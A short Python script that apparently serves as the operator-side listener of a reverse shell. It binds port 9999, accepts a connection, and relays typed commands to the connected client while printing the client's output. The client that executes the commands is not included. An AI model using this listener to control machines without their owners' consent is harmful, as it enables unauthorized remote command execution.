import socket
import sys

def  socket_creat():
	try:	
		global host #the ip
		global port 
		global s    #socket
		host = ''
		port = 9999
		s = socket.socket()
		print("socket created succefully")
	except socket.error as msg:
		print("erro while creating socketing"+str(msg))

#binding data to socket and wait connection from client
def socket_bind():
	try:	
		global host #the ip
		global port 
		global s    #socket
		print("binding socket to port: "+str(port))
		s.bind((host,port))
		s.listen(5)
	except socket.error as msg:
		print("error binding socketing to the client"+str(msg)+"\n"+"retrying...")
		socket_bind()

#stablishing a connection with a clinet
def socket_accept():
	conn,adress=s.accept()
	print("the connection has been stablished |"+"IP "+str(adress[0])+" | PORT "+str(adress[1]))
	send_commands(conn)
	conn.close()

def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			sys.exit()
		if len(str.encode(cmd)) > 0 :
			conn.send(str.encode(cmd))
			client_response= str(conn.recv(1024),"utf-8")
			print(client_response,end="")

def main():
	socket_creat()
	socket_bind()
	socket_accept()
main()